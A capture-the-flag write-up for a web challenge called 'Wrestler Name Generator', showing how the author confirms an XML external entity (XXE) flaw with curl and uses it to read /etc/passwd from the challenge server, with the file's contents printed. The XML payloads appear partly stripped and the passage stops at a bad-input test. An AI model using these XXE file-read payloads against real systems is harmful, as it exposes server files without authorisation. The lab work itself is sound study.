# Wrestler Name Generator
Web, 150 points
## Description
> Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.
## Solution
We visit the attaches site and see a form:
```html
    First Name
    Last Name
    Weapon of Choice
      Steel Chair
      Flaming Table
      Barb Wire Bat
      Ladder
      Thumbtacks
```
Submitting the form triggers the following script:
```html
document.getElementById("button").onclick = function() {
  var firstName = document.getElementById("firstName").value;
  var lastName = document.getElementById("lastName").value;
  var input = btoa("" + firstName + "" + lastName+ "");
  window.location.href = "/generate.php?input="+encodeURIComponent(input);
};
```
The form input is translated to XML. This method might be vulnerable to XXE.
> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
Let's perform a simple proof of concept, taken from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection).
We try to send the following XML:
```xml
 ]>
    John
    &example;
```
If the service is vulnerable to XXE, the result will return as "John Doe".
```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# echo ' ]>John&example;' | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(
  Wrestler Name Generator
  Your Wrestler Name Is:
  John "The Ferocious" Doe
Your Hacker Name Is: REDACTED-->
  Go Back
```
It worked!
Let's try reading a file from the server:
```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat 
]>
John&test;
TEXT
  Wrestler Name Generator
  Your Wrestler Name Is:
  John "The Slasher" root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
Your Hacker Name Is: REDACTED-->
  Go Back
```
Looks good, we are able to read files.
What happens if we enter bad input?
```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
bad input
TEXT